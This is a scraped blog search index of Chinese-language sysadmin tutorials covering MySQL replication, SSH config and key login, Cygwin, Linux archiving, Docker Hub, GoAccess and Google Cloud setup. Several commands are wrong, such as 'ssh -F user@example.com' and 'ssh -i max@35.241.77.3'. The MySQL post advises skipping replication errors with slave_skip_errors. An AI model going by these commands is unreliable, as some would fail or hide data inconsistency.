打开二进制日志[mysqld]server_id&#x3D;1log-bin&#x3D;master-binlog-bin-index&#x3D;master-bin.index 创建同步用户，并赋予权限（如果从服务器以reql 这个账号进行连接，就赋予同步数据库的权限，并且这个权限是所有数据库的所有数据表） 1234$ mysql -uroot -p mysql&gt; create user repl;mysql&gt; grant replication slave on *.* to &#39;user&#39;@&#39;your_slave_addr&#39; identified by &#39;password&#39;mysql&gt; flush privileges; 上面的IP 是指 Slave 服务器的IP 地址。重启Mysql 服务。 查看Master 配置： 1mysql&gt; show master status; Salve 配置1234567# vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf# 打开relay 日志[mysqld]server_id&#x3D;2relay-log-index&#x3D;slave-relay-bin.indexrelay-log&#x3D;slave-relay-bin 重启Mysql 服务。 指定Master 主机 12$ mysql -uroot -pmysql&gt; change master to master_host&#x3D;&quot;your master ip &quot;, master_port&#x3D;3306, master_user&#x3D;&#39;repl&#39;,master_password&#x3D;&#39;password&#39;,master_log_file&#x3D;&#39;master-bin.000001&#39;,master_log_pos&#x3D;0; 参数说明： master_host：Master∑主机的外网IP 地址 master_port：端口 master_user：Master主机上进行同步的用户 master_password：密码 master_log_file：Master 输出的二进制文件的名称（在Master 主机上使用show master status命令查看） master_log_pos：哪里开始同步 开启主从同步 1mysql&gt; start slave; 查看从库同步状态 1mysql&gt; show slave status; 可能会遇到的问题 Last_Errno: 1146 Last_Error: Error executing row event: ‘Table ‘panda.t’ doesn’t exist’ 解决办法：使用slave-skip-errors 参数跳过该错误。 1234# vim &#x2F;etc&#x2F;mysql&#x2F;mysql.conf.d&#x2F;mysqld.cnf[mysqld]slave_skip_errors&#x3D;1146 重启从库即可。","categories":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/categories/Mysql/"}],"tags":[{"name":"Mysql","slug":"Mysql","permalink":"https://www.0x2beace.com/tags/Mysql/"}]},{"title":"了解 SSH Config","slug":"understand-ssh-config","date":"2020-09-02T15:58:02.000Z","updated":"2020-09-02T15:58:54.842Z","comments":true,"path":"understand-ssh-config/","link":"","permalink":"https://www.0x2beace.com/understand-ssh-config/","excerpt":"很早就接触到了SSH，起初并不知道有ssh config这样一个东西存在，基本上是摸着石头过河，中间遇到过不少问题，走过不少弯路。 最后总结出来了两个解决办法，今天无意间发现原来其中有一个这么好用的工具一直都被我忽略了。","text":"很早就接触到了SSH，起初并不知道有ssh config这样一个东西存在，基本上是摸着石头过河，中间遇到过不少问题，走过不少弯路。 最后总结出来了两个解决办法，今天无意间发现原来其中有一个这么好用的工具一直都被我忽略了。 什么是SSH Config 先决条件：在使用ssh 之前，需要先安装好Openssh、SSH1或者是SSH2。（Linux、Mac用户请忽略） ~/.ssh/config 是通过ssh 连接远程服务器时使用的配置文件。 为什么要使用SSH Config例如：使用SSH 进行远程连接，一般会这样做： 1$ ssh Boo@18.182.201.142 在简单地连接情况下，它并不麻烦。但是当端口号不是默认值（22）时，当密钥对不是默认名称时，连接就变得复杂了。 12345678# 指定端口连接$ ssh Boo@18.182.201.142 -p 2222# 非默认名称密钥认证$ ssh -i ~&#x2F;.ssh&#x2F;id_rsa_aliyun Boo@18.182.201.142# 以上两种情况综合$ ssh -i ~&#x2F;.ssh&#x2F;id_rsa_aliyun Boo@18.182.201.142 -p 2222 此时，使用ssh config就变得很有用了。 123456# vim ~&#x2F;.ssh&#x2F;configHost aliyun HostName 18.182.201.142 Port 2222 User Boo IdentityFile ~&#x2F;.ssh&#x2F;id_rsa_aliyun 现在在连接使用如下命令： 1$ ssh aliyun 是不是非常的方便！就算此时手上有多台服务器需要管理，只要配置好对应的~/.ssh/config参数，就可以很轻松的进行连接了。 但需要注意的是：有关ssh 的配置不能分成多个文件，只能写在这一个文件中~/.ssh/config（如果你有更好的办法）。 SSH 的配置文件同样适用于其他程序，如：scp，sftp等。 常用的配置选项配置文件格式 空行和以’＃’开头的行是注释。 每行以关键字开头，后跟参数。 配置选项可以用空格或可选的空格分隔，只需要一个=。 参数可以用双引号（”）括起来，以指定包含空格的参数。 常用关键字SSH Config 的关键字不区分大小写，但是参数区分大小写。 Host：可以理解为远程主机名的别名，最终指明这个名称进行连接，如：ssh aliyun HostName：需要远程连接的主机名，通常都是IP。 Port：指定连接端口 User：指定连接用户 IdentityFile：指明远程连接密钥文件 注：Host 关键字可以包含以下模式匹配： *- 匹配零个或多个字符。例如，Host 将匹配所有主机，同时`192.168.0.匹配192.168.0.0/24`子网中的所有主机。 ? - 恰好匹配一个字符。该模式Host 10.10.0.?将匹配10.10.0.[0-9]范围内的所有主机。 !- 在模式的开头将否定其匹配例如，Host 10.10.0.* !10.10.0.5将匹配10.10.0.0/24子网中的任何主机，除了10.10.0.5。 配置文件加载顺序 全局配置文件：/etc/ssh/ssh_config 用户配置文件：~/.ssh/config ssh 客户端按以下优先顺序读取其配置： 从命令行指定的选项 用户的ssh 配置文件 全局的ssh 配置文件 如果希望SSH 客户端忽略ssh 配置文件中指定的所有选项，可以使用： 1$ ssh -F user@example.com 恢复连接常用SSH 的小伙伴可能都知道，使用SSH 连接到远程服务器之后，如果一段时间没有输入任何指令，很有可能会断开与服务器的连接，需要重连就会变得很麻烦。 此时，ssh config 又变得很有用了。 123456＃定期向服务器发送实时报告（每60秒，可以自定义）ServerAliveInterval 60# 如果想要针对某个连接单独使用，需要放在Host 指令下，全局则放在最头部Host aliyun ServerAliveInterval 60 可能感兴趣的内容 如何在Linux 中更改SSH 端口 关于 ~/.ssh/config 使用 SSH 配置文件 ssh_config 指令详解 SSH 官网 OpenSSH 客户端SSH 配置文件","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Cygwin 快速上手","slug":"cygwin-quick-start","date":"2020-09-01T14:16:25.000Z","updated":"2020-09-03T15:47:42.934Z","comments":true,"path":"cygwin-quick-start/","link":"","permalink":"https://www.0x2beace.com/cygwin-quick-start/","excerpt":"在很早之前就听说过Cygwin和MinGW64这两个东西，只是当时不是很理解这两个东西是做什么的，还经常和msysGit 搞混淆，加上最近用MinGW64用的很不顺手，所以打算安装一个Cygwin。","text":"在很早之前就听说过Cygwin和MinGW64这两个东西，只是当时不是很理解这两个东西是做什么的，还经常和msysGit 搞混淆，加上最近用MinGW64用的很不顺手，所以打算安装一个Cygwin。 区别与联系首先来介绍下这三者分别是什么。 CygwinCygwin是一个类似Unix的环境和Microsoft Windows命令行界面。 大量GNU和开源工具，提供类似于 Windows上的 Linux发行版的功能。用官网的话说就是：在Windows 上获取Linux 的感觉。 MinGW64MSYS(MSYS | MinGW) 是一个在 Windows 下的类Unit工作环境。因为 Git 里面包含很多 Shell 跟 Perl 脚本，所以它(Git)需要一个这样的环境。 每次右键打开Git Bash时，其终端就是MinGW64 msysGitmsysGit是一个构建环境，其中包含希望通过为Git for Windows编写代码来贡献所需的所有工具。 所以，Git for Windows 可以在 Windows 上安装可运行 Git 的最小环境，而 msysGit 是构建 Git for Windows 所需的环境。 安装Cygwin安装Cygwin 的过程比MinGW 要复杂些，其中主要需要注意的是模块部分。 Cygwin 好用的原因很大程度上是因为其功能之丰富，而各种功能则是来自于其模块。 终于安装好了，感觉很厉害的样子，是我想要的东西，希望在今后的日子中 能和它好好相处。 Mintty是一个终端仿真器 用于Cygwin的， MSYS或 Msys2 和衍生的项目，以及用于WSL。 参考链接 从Windows 运行下载Cygwin64 Cygwin 是什么，不是什么？–官网 Cygwin 安装教程 详细","categories":[{"name":"终端","slug":"终端","permalink":"https://www.0x2beace.com/categories/%E7%BB%88%E7%AB%AF/"}],"tags":[{"name":"Cygwin","slug":"Cygwin","permalink":"https://www.0x2beace.com/tags/Cygwin/"},{"name":"终端","slug":"终端","permalink":"https://www.0x2beace.com/tags/%E7%BB%88%E7%AB%AF/"}]},{"title":"Linux 压缩、解压、打包详解","slug":"detailed-explanation-of-linux-compression-decompression-and-packaging","date":"2020-08-31T15:47:15.000Z","updated":"2020-08-31T15:51:20.676Z","comments":true,"path":"detailed-explanation-of-linux-compression-decompression-and-packaging/","link":"","permalink":"https://www.0x2beace.com/detailed-explanation-of-linux-compression-decompression-and-packaging/","excerpt":"在Linux 中，解压、压缩、打包是日常会很频繁用到的几个操作，但是因为参数很多，没有记忆点，加上压缩文件的类型很多，如果不经常使用，是真的容易忘记。","text":"在Linux 中，解压、压缩、打包是日常会很频繁用到的几个操作，但是因为参数很多，没有记忆点，加上压缩文件的类型很多，如果不经常使用，是真的容易忘记。 所以这篇笔记就是用来整理常见的那些解压、压缩、打包的命令。 在正式学习之前，需要明确的两个概念，打包和压缩不是一回事： 打包：是指将一大堆文件或目录变成一个总的文件。 压缩：则是将一个大文件通过压缩算法变成一个小文件。 为什么要区分这两个概念呢？这源于Linux 中很多压缩程序只能针对一个文件进行压缩，这样当你想要压缩一大堆文件时，你得先将这一大堆文件先打成一个包（tar命令），然后再用压缩程序进行压缩（gzip bzip2命令）。 tar压缩/打包仅打包，不压缩。 1tar -cvf foo.tar foo foo.tar这个文件名是自定义的，只是习惯上我们使用 .tar 作为包文件。 打包，且压缩。-z参数表示以 .tar.gz 或者 .tgz 后缀名代表 gzip 压缩过的 tar 包。 1tar -zcvf foo.tar.gz foo 打包，且压缩。-j 参数表示以 .tar.bz2 后缀名作为tar包名。 1tar -jcvf foo.tar.gz foo 解压在当前目录下直接解压： 1tar -zxvf foo.tar.gz 注意，如果这个目录下有同名的文件，不会询问，直接覆盖。 解压至指定文件夹： 1tar -zxvf foo.tar.gz -C &lt;dir name&gt; gzipgzip 命令用来压缩文件。文件经它压缩过后，其名称后面会多处 .gz 扩展名（不带 .tar）。 压缩将当前目录的每个文件压缩成.gz文件： 1gzip * 递归压缩指定目录的所有文件及子目录： 1gzip -r &lt;dir name&gt; 解压解压当前目录下的foo.gz 文件： 1gzip -d foo.gz 解压完成之后，foo.gz 就变成了 foo 文件。 递归解压目录： 1gzip -dr &lt;dir name&gt; 解压完成之后，&lt;dir name&gt; 目录下的所有 .gz 文件都会变成正常文件。 zipzip 可以用来解压缩文件，或者对文件进行打包操作。文件经它压缩后会另外产生具有 .zip 扩展名的压缩文件。 压缩将当前目录下的指定目录，压缩为 .zip文件： 1zip -q -r foo.zip &lt;dir name&gt; 将指定目录下的所有文件及其文件夹，压缩为.zip 文件： 1zip -q -r foo.zip &#x2F;&lt;path to dir&gt; 注意，产生的压缩文件在执行命令的那个目录下。 解压unzip 命令用于解压缩由 zip 命令压缩的 .zip压缩包。 查看压缩包内容： 1unzip -v foo.zip 将压缩文件在指定目录下解压缩，如果已有相同的文件存在，要求 unzip命令不覆盖原先的文件。 1unzip -n foo.zip -d &#x2F;&lt;file to dir&gt; 将压缩文件在当前目下解压，如果已有相同的文件，不询问，直接覆盖。 1unzip -o foo.zip 总结Linux 下的压缩解压其实并不复杂，只是不常用的情况下，很容器忘记。 如果你不知道在什么场景下，该使用什么命令，可以参照： 如果只有一个大文件，可以使用 gzip 或者 zip命令。 如果是一个完整的目录，里面有很多子目录以及文件，可以使用tar命令。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"}]},{"title":"Docker Hub 快速上手","slug":"docker-hub-quick-start","date":"2020-08-30T10:32:02.000Z","updated":"2020-08-30T10:35:11.952Z","comments":true,"path":"docker-hub-quick-start/","link":"","permalink":"https://www.0x2beace.com/docker-hub-quick-start/","excerpt":"最近将常使用的镜像放在了Docker 仓库（Docker Hub）上。GitHub 是托管代码的地方，而Docker Hub 则是托管镜像的地方。","text":"最近将常使用的镜像放在了Docker 仓库（Docker Hub）上。GitHub 是托管代码的地方，而Docker Hub 则是托管镜像的地方。 目前大部分需求都可以直接在 Docker Hub 中下载镜像来实现，如果想使用自己仓库中的镜像，那么需要先注册一个账号。 创建仓库想要从 Docker Hub 使用自己的镜像之前，首先得创建一个仓库，然后将目标镜镜像 push 到该仓库。 这个仓库可以是公开的也可以是私有的，这个并不影响你正常使用。 创建成功之后，就可以看到该仓库了。 发布镜像在发布之前，确保你本地存在目标镜像，可以使用 docker images来查看： 123$ docker imagesREPOSITORY TAG IMAGE ID CREATED SIZEadminer latest c3588b6003bb 3 weeks ago 90.4MB 创建 Tag： 12345# 语法docker tag local-image:tagname new-repo:tagname# 实例docker tag adminer:latest hoooliday&#x2F;runfast:adminer 前面的 tagname 是本地镜像的标签名称，后面的tagname 是该镜像在仓库中的标签名称。 再次查看本地镜像： 123$ docker imageshoooliday&#x2F;runfast adminer c3588b6003bb 3 weeks ago 90.4MBadminer latest c3588b6003bb 3 weeks ago 90.4MB 发布镜像： 12345# 语法docker push new-repo:tagname# 实例docker push hoooliday&#x2F;runfast:adminer 发布成功之后，可以打开 Docker Hub 在 Repositories 的列表中就看到刚才的镜像了。 拉取镜像首先需要在命令行中登录你的 docker hub 账号： 1$ docker login 拉取自己的镜像，这里以 adminer 这个镜像为例： 1234docker run --link mysql:mysql --name adminer \\-d --restart&#x3D;always \\-p 8006:8080 \\hoooliday&#x2F;runfast:adminer 唯一需要注意的就是最后一行，如果想要使用官方最新版本的 adminer ，那就直接写成 adminer，但如果想要使用自己的镜像，那就需要写成 username/repo:tagname 的格式。 查看本地所有镜像： 12$ docker imageshoooliday&#x2F;runfast adminer c3588b6003bb 3 weeks ago 90.4MB 此持就完成了Docker 镜像的发布和拉取了，当然这只是 Docker Hub 所有功能中的冰山一角。","categories":[{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/categories/Docker/"},{"name":"Tutorial","slug":"Docker/Tutorial","permalink":"https://www.0x2beace.com/categories/Docker/Tutorial/"}],"tags":[{"name":"Tutorial","slug":"Tutorial","permalink":"https://www.0x2beace.com/tags/Tutorial/"},{"name":"Docker","slug":"Docker","permalink":"https://www.0x2beace.com/tags/Docker/"},{"name":"Docker Hub","slug":"Docker-Hub","permalink":"https://www.0x2beace.com/tags/Docker-Hub/"}]},{"title":"Linux 如何生成密钥对进行 ssh 免密登录","slug":"how-to-generate-a-key-pair-for-ssh-login-without-password","date":"2020-08-29T03:46:41.000Z","updated":"2020-08-29T03:47:53.463Z","comments":true,"path":"how-to-generate-a-key-pair-for-ssh-login-without-password/","link":"","permalink":"https://www.0x2beace.com/how-to-generate-a-key-pair-for-ssh-login-without-password/","excerpt":"最近因为项目快要上线了，服务器从测试环境转到了生产环境，登录方式也从原来的密码认证替换成了密钥认证。","text":"最近因为项目快要上线了，服务器从测试环境转到了生产环境，登录方式也从原来的密码认证替换成了密钥认证。 这么做的目的是为了防止服务器密码被暴力破解。 ssh 是什么？ ssh 是一种协议，它可以基于密码进行认证，也可以基于密钥去认证用户。 生成密钥对这里我们使用 RSA 类型的加密类型来创建密钥对。 1ssh-keygen -f ~&#x2F;.ssh&#x2F;your_key_name -f 参数表示指定密钥对生成位置与名称 密钥对通常放在 $HOME/.ssh 目录下 回车即可创建密钥对，如果不需要为密钥对进行加密，那么可以一路回车。 创建成功之后，可以看到 .ssh 目录下多了两个文件，分别是： your_key：密钥对的私钥，通常放在客户端。 your_key.pub：密钥对中的公钥，通常放在服务端。 将本地的公钥传到服务器上注意：这里是将your_key.pub 公钥文件上传至你需要连接的服务器，而不是your_key私钥文件。 1ssh-copy-id -i ~&#x2F;.ssh&#x2F;your_key.pub user@&lt;ip address&gt; -pport -i 参数表示使用指定的密钥，-p参数表示指定端口，ssh 的默认端口是 22，如果没有更改默认端口，则可以省略。 这里需要输入一次密码进行确认，如果成功之后，会看到以下内容： 本地的公钥文件上传在服务器的哪里？ 在该用户的.ssh/authorized_keys 文件中。 1cat ~&#x2F;.ssh&#x2F;authorized_keys 通过密钥对进行免密登录现在我们可以使用以下命令登录到服务器中了： 1ssh -p port -i ~&#x2F;.ssh&#x2F;your_key user@&lt;ip address&gt; 不出意外，就可以不用输入密码而直接成功登录了。 如果你仍然需要输入密码或者遇到其他问题了，可以从以下方向进行排查。 常见问题： 如果没有使用默认的密钥名称（id_rsa），则在连接主机时需要加上-i 参数，指定对应密钥的名称。否则由于默认私钥与远程主机中的自定义公钥不匹配，自然无法基于密钥进行认证，会再次提示你输入密码。 服务端的$HOME/.ssh目录的正常权限是700，服务端$HOME/.ssh/authorized_keys文件的权限默认为600。 上传密钥时使用的是：公钥（.pub），进行密钥认证时使用的是：私钥。 配置ssh config上面的命令虽然可以实现免密登录，但是命令太长了，就算是复制粘贴也有可能会出错。 那有没有什么好的办法，解决这个问题呢？ 当然是有的啦。 在$HOME/.ssh 目录下，创建一个名为config的文件。 1vim $HOME&#x2F;.ssh&#x2F;conifg 加入以下配置： 123456Host alias User user HostName ip address Port port IdentityFile ~&#x2F;.ssh&#x2F;your_key ServerAliveInterval 360 参数说明： Host：可以理解成别名，配置完成之后，最后就通过 ssh alias 进行登录。 User：远程主机的用户名称 HostName：远程主机的地址 Port：端口号 IdentityFile：私钥文件的路径 ServerAliveInterval：保持客户端与服务端会话在短时间内不会断开。 当然，如果你是使用ssh 客户端，那就不用配置这些。 禁用通过密码认证如果上面的配置都无误，可以正常通过密钥进行免密登录，那么最后需要做的一件事情就是关闭服务端的通过密码进行身份认证。 1234vim &#x2F;etc&#x2F;ssh&#x2F;sshd_config# 将yes 改为 noPasswordAuthentication yes 然后重启 sshd 服务。 1service sshd restart 以上就是有关如何用自定义的密钥对进行免密认证的全部过程了。","categories":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/categories/Linux/"}],"tags":[{"name":"Linux","slug":"Linux","permalink":"https://www.0x2beace.com/tags/Linux/"},{"name":"SSH","slug":"SSH","permalink":"https://www.0x2beace.com/tags/SSH/"},{"name":"SSHD","slug":"SSHD","permalink":"https://www.0x2beace.com/tags/SSHD/"}]},{"title":"命名规范——程序员的自我修养","slug":"naming-convention-programmer-s-self-cultivation","date":"2020-08-28T13:36:57.000Z","updated":"2020-08-28T13:40:17.879Z","comments":true,"path":"naming-convention-programmer-s-self-cultivation/","link":"","permalink":"https://www.0x2beace.com/naming-convention-programmer-s-self-cultivation/","excerpt":"之所以会有这样一篇笔记呢，是因为在各种不同的场景下，面临命名这件事情，有时候会犯迷糊，不知道该如何选择正确的方式命名。所以这篇笔记的目的就是为解决这个问题。","text":"之所以会有这样一篇笔记呢，是因为在各种不同的场景下，面临命名这件事情，有时候会犯迷糊，不知道该如何选择正确的方式命名。所以这篇笔记的目的就是为解决这个问题。 命名规范命名规范包含了：目录、文件、变量、函数命名。值得一提的是：命名规则没有谁对谁错，在项目中保持一致才是关键。 混乱或错误的命名不仅让我们对代码难以理解，更糟糕的是，会误导我们的思维，导致对代码的理解完全错误。相反，良好的命名，则可以让我们的代码非常容易读懂，也能向读者正确表达事物以及逻辑的本质，从而使得代码的可维护性就大大增强，读命名好的文章是非常流畅的，会有一种享受的感觉。 目录因为Windows，OSX 下文件夹不区分大小写，Linux 是区分的。所以在文件夹的命名上面，建议全部用小写。可以包含下划线(_)或连字符(-)。如果没有约定，(_)更好。 文件文件的命名也是推荐和目录的连字符保持一致。Linux 文件系统推荐的文件命名是下划线(_)。 类类型名称通常使用大写驼峰命名法 12class MyClass ... 类成员不管是静态还是非静态，类数据成员的命名都可以和普通变量一样，采用驼峰命名法： 123456789class MyClass &#123; public $myVariable; public static $myStaticVariable; public function myFunction($firstWord, $secondWord)&#123; &#x2F;&#x2F;方法中的参数名推荐使用小驼峰命名法 ... &#125;;&#125; 一般名称的前缀都是有第一规律的，如is（判断）、get（得到），set（设置）。 变量变量的命名有两种方式： 下划线命名法：my_variable 小驼峰命名法：myVariable 但通常还是推荐使用，下划线命名法（全是小写）。 不同的语言也是有不同的规范，例如JavaScript 变量推荐驼峰命名法，CSS 推荐连字符(-)。 常量、全局常量常量和全局常量通常使用全大写和下划线的方式来命名，例如： 12const MY_CONSTANT;define(&quot;DEFAULT_NUM&quot;, 10); 特殊变量12345&#x2F;&#x2F;引用变量&#x2F;&#x2F;静态变量&#x2F;&#x2F;全局变量 函数命名函数的命名使用下划线命名法： 123function my_function()&#123; ...&#125; 补充说明函数和方法的区别：函数是一段可以重用的代码块，方法是在类里面的函数。 参考链接： PHP 命名规范 如何优雅的为变量和函数命名 命名约定 | Google开源项目风格指南 命名规范 | 程序员的自我修养","categories":[{"name":"碎碎念","slug":"碎碎念","permalink":"https://www.0x2beace.com/categories/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}],"tags":[{"name":"碎碎念","slug":"碎碎念","permalink":"https://www.0x2beace.com/tags/%E7%A2%8E%E7%A2%8E%E5%BF%B5/"}]},{"title":"日志分析工具 - GoAccess","slug":"log-analysis-tool-goaccess","date":"2020-08-27T14:59:41.000Z","updated":"2020-11-09T00:28:06.901Z","comments":true,"path":"log-analysis-tool-goaccess/","link":"","permalink":"https://www.0x2beace.com/log-analysis-tool-goaccess/","excerpt":"日志的重要性不言而喻，可我似乎完全忽略了它，导致往往出现什么问题，第一时间并不是去看日志。","text":"日志的重要性不言而喻，可我似乎完全忽略了它，导致往往出现什么问题，第一时间并不是去看日志。 很显然我完全忽视了它的强大性，就拿 nginx 的访问日志来说，可以从中分析出如下信息： 请求的响应时间 请求达到的后端服务器的地址和端口 请求是否存在缓存配置 请求体、请求头、响应体和响应头的大小等 客户端的IP 地址、UserAgent 等信息 自定义变量的内容 通过这些信息，可以得到响应耗时的请求以及请求量和并发量，从而分析并发原因，这对于应用级别的服务来说是非常重要的。 GoAccess 是什么GoAccess 是一个开源的实时网络日志分析器和交互式查看器，可以在类 Unix 系统中的终端或通过浏览器运行。 —— GoAccess 官方 为什么选择 GoAccess？ 因为GoAccess 被设计成一个基于终端的快速日志分析器。它的核心思想是实时快速分析和查看Web服务器统计信息，而无需使用浏览器。同时也可以将输入到HTML 或者 CSV、JSON。 GoAccess几乎可以解析任何Web日志格式（Apache，Nginx，Amazon S3，Elastic Load Balancing，CloudFront等）。只需要设置日志格式并根据您的日志运行它。 GoAccess 入门昨天在使用 GoAccess 时，踩到了一些坑，导致我一度认为这个工具是不是存在什么Bug。因为在看别人的教程中都是开箱即用。 下面从安装到使用会一一详细说明。 安装 GoAccess因为服务器的操作系统是 Ubuntu，所以这里以 Ubuntu为例： 因为并非所有发行版都提供最新版本的 GoAccess，所以这里使用官方提供的最新稳定版的安装方式 1234$ echo &quot;deb http:&#x2F;&#x2F;deb.goaccess.io&#x2F; $（lsb_release -cs）main&quot; | sudo tee -a &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;goaccess.list$ wget -O - https:&#x2F;&#x2F;deb.goaccess.io&#x2F;gnugpg.key | sudo apt-key add - $ sudo apt-get update$ sudo apt-get install goaccess 确定日志格式在计算机安装了GoAccess 之后，要做的第一件事情就是确定访问日志的日志格式，可以在永久设置它们，也可以通过命令行传递他们。 这里用Nginx 的 access.log 为例 136.113.128.155 - - [28&#x2F;Apr&#x2F;2019:02:20:01 +0000] &quot;GET &#x2F;Manage&#x2F;Dingdan&#x2F;fail_index&#x2F;startTime&#x2F;2019-04-28+00%3A00%3A00&#x2F;endTime&#x2F;2019-04-28+23%3A59%3A59.html HTTP&#x2F;1.1&quot; 200 7798 &quot;http:&#x2F;&#x2F;www.692213.com&#x2F;Manage&#x2F;Dingdan&#x2F;fail_index&#x2F;startTime&#x2F;2019-04-28+00%3A00%3A00&#x2F;endTime&#x2F;2019-04-28+23%3A59%3A59.html&quot; &quot;Mozilla&#x2F;5.0 (Windows NT 10.0; WOW64) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;70.0.3538.110 Safari&#x2F;537.36&quot; 方式一，配置.goaccessrc文件： 12345vim ~&#x2F;.goaccessrctime-format %Tdate-format %d&#x2F;%b&#x2F;%Ylog_format %h %^[%d:%t %^] &quot;%r&quot; %s %b &quot;%R&quot; &quot;%u&quot; %^ 方式二，在命令行传递参数： 1$ goaccess nginx&#x2F;access.log --log-format&#x3D;&#39;%h %^[%d:%t %^] &quot;%r&quot; %s %b &quot;%R&quot; &quot;%u&quot; %^&#39; --date-format&#x3D;%d&#x2F;%b&#x2F;%Y --time-format&#x3D;%T 注意：无论是配置文件还是命令行参数 都不是永远不变的，只是相对于你要监控的日志格式。 运行GoAccess方式一，通过-p参数，指定配置文件。 1$ goaccess nginx&#x2F;access.log -p ~&#x2F;.goaccessrc 方式二，直接在命令行参数中指定日志格式，详情见上面的例子。 终端输出以下提示使用预定义日志格式的日志配置对话框供您选择，然后实时显示统计信息。 1$ goaccess nginx&#x2F;access.log -c 通常选择第三个，通用日志格式（CLF），成功之后就是这样个样子： 控制台下的操作方法： 1234567891011121314151617* F1或h主要帮助。* F5重绘主窗口。* q退出程序，当前窗口或折叠活动模块* o或ENTER展开所选模块或打开窗口* 0-9并将Shift + 0所选模块设置为活动状态* j在展开的模块中向下滚动* k在扩展模块中向上滚动* c设置或更改方案颜色* ^ f在活动模块中向前滚动一个屏幕* ^ b在活动模块中向后滚动一个屏幕* TAB迭代模块（转发）* SHIFT + TAB迭代模块（向后）* s对活动模块的排序选项* &#x2F;搜索所有模块（允许正则表达式）* n找到下一个出现的位置* g移至屏幕的第一个项目或顶部* G移动到屏幕的最后一项或底部 静态HTML 输出以下内容分析访问日志并在静态HTML报告中显示统计信息。 1$ goaccess -a -d -f nginx&#x2F;access.log.1 -p ~&#x2F;.goaccessrc -o &#x2F;var&#x2F;www&#x2F;report.html 实时HTML 输出1$ goaccess -a -d -f nginx&#x2F;access.log.1 -p ~&#x2F;.goaccessrc -o &#x2F;var&#x2F;www&#x2F;report.html --real-time-html 然后用浏览器访问，大概就是这个样子： 配置文件及日志格式说明GoAccess 的配置文件位于%sysconfdir%/goaccess.conf或~/.goaccessrc 其中，%sysconfdir%是 /etc/，/usr/etc/ 或 /usr/local/etc/ time-format和date-format的格式通常都是固定的，只有log-format的格式视具体日志格式而定。 123time-format %Tdate-format %d&#x2F;%b&#x2F;%Y log-format常用格式说明： 1234567891011121314151617181920212223* %x与时间格式和日期格式变量匹配的日期和时间字段。当给出时间戳而不是日期和时间在两个单独的变量中时使用。* %t时间字段匹配时间格式变量。* %d与日期格式变量匹配的日期字段。* %v服务器名称根据规范名称设置（服务器块或虚拟主机）。* %e这是HTTP身份验证确定的请求文档的人的用户标识。* %hhost（客户端IP地址，IPv4或IPv6）* %r来自客户端的请求行。这需要围绕请求的特定分隔符（单引号，双引号等）可解析。否则，使用特殊的格式说明符，如组合%m，%U，%q和%H解析各个字段。注意：使用或者%r获得完整的请求OR %m，%U，%q并%H形成你的要求，不要同时使用。* %m请求方法。* %U请求的URL路径。注意：如果查询字符串在%U，则无需使用%q。但是，如果URL路径不包含任何查询字符串，则可以使用%q并将查询字符串附加到请求中。* %q查询字符串。* %H请求协议。* %s服务器发送回客户端的状态代码。* %b返回给客户端的对象大小。* %R“Referer”HTTP请求标头。* %u用户代理HTTP请求标头。* %D服务请求所需的时间，以微秒为单位。* %T服务请求所需的时间，以毫秒为单位，分辨率为毫秒。* %L 服务请求所用的时间，以毫秒为单位的十进制数。* %^忽略此字段。* %~向前移动日志字符串，直到找到非空格（！isspace）char。* ~h X-Forwarded-For（XFF）字段中的主机（客户端IP地址，IPv4或IPv6）。 常用参数 -f：指定需要分析的日志文件路径 -c：程序启动时提示日志/日期配置窗口 -p：指定要使用的自定义配置文件 -d：在HTML或JSON输出上启用IP解析器 -o：输出到指定扩展名文件中（Html、Json、CSV） -a：按主机启用用户代理列表。为了更快地解析，请不要启用此标志 -d：在HTML或JSON输出上启用IP解析器。 总结：GoAccess 从安装到使用还是非常方便的，不仅可以对历史的日志进行分析，也能实时对日志进行分析，所支持的日志格式基本能满足大多数应用场景。 参考链接 GoAccess 官网 GoAccess 入门 使用GoAccess 分析Nginx 日志 将Nginx log_format转换为goaccess配置文件 GoAccess 日志格式转换案例一 GoAccess 日志格式转换案例二 GoAccess 日志格式转换案例三 GoAccess 日志格式转换案例四","categories":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/categories/Nginx/"}],"tags":[{"name":"Nginx","slug":"Nginx","permalink":"https://www.0x2beace.com/tags/Nginx/"},{"name":"GoAccess","slug":"GoAccess","permalink":"https://www.0x2beace.com/tags/GoAccess/"},{"name":"Logs","slug":"Logs","permalink":"https://www.0x2beace.com/tags/Logs/"}]},{"title":"手把手教你如何创建启动 Google Cloud 实例","slug":"teach-you-how-to-create-and-start-a-google-cloud-instance","date":"2020-08-26T15:25:21.000Z","updated":"2020-08-27T06:27:35.489Z","comments":true,"path":"teach-you-how-to-create-and-start-a-google-cloud-instance/","link":"","permalink":"https://www.0x2beace.com/teach-you-how-to-create-and-start-a-google-cloud-instance/","excerpt":"最近需要在Google Cloud 上重新开一台Hk区的服务器，所以写这篇笔记用来记录操作过程。","text":"最近需要在Google Cloud 上重新开一台Hk区的服务器，所以写这篇笔记用来记录操作过程。 创建VM 实例 Google Cloud 官网 Google Cloud Platform 控制台 进入控制台，找到 Compute Engine，点击创建实例。 新建虚拟机实例，选择相应的配置。 选择操作系统映像，以及磁盘大小。 基本配置如下： 然后点击创建就可以了。创建成功之后，就可以看到该服务器的IP地址了。 这里需要注意的是，Google Cloud 的远程连接SSH 的方式与其他平台有所区别。 创建SSH 连接Compute Engine =》元数据 =》SSH 密钥 找到修改，然后上传你的 SSH Key。 不知道SSH Key 是什么？ 1234$ ssh-keygen -t rsa# 打开终端，输入上面那个命令# 然后在~&#x2F;.ssh 目录下会生成一个 公钥和私钥# 将 .pub 结尾的文件打开，复制其中的值，粘贴到Google Cloud 上就可以了。 连接使用ssh -i max@35.241.77.3 命令连接，其中 max 是用户名，后面是对应服务器 